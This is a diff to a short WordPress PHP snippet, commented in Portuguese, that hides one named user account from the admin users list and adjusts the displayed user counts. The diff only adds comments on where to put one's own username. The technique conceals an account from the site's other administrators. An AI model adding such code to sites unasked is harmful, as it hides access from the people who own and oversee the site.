@@ -1,3 +1,5 @@
+//Altere o usuário que deseja ocultar nas linhas: 11 e 25
+
 add_action('pre_user_query', 'ocultar_usuario_especifico');
 
 function ocultar_usuario_especifico($query) {
@@ -6,7 +8,7 @@ function ocultar_usuario_especifico($query) {
         global $current_user;
 
         // Usuário que será oculto
-        $usuario_oculto = 'AgenciaBirth';
+        $usuario_oculto = 'AgenciaBirth'; /* Troque AgenciaBirth pelo seu usuário */
 
         // Verifica se o usuário atual não é o "oculto"
         if ($current_user->user_login !== $usuario_oculto) {
@@ -20,7 +22,7 @@ function ocultar_usuario_especifico($query) {
 add_filter('views_users', 'ajustar_total_usuarios_visiveis');
 
 function ajustar_total_usuarios_visiveis($views) {
-    $usuario_oculto = 'AgenciaBirth';
+    $usuario_oculto = 'AgenciaBirth'; /* Troque AgenciaBirth pelo seu usuário */
 
     global $wpdb;
 
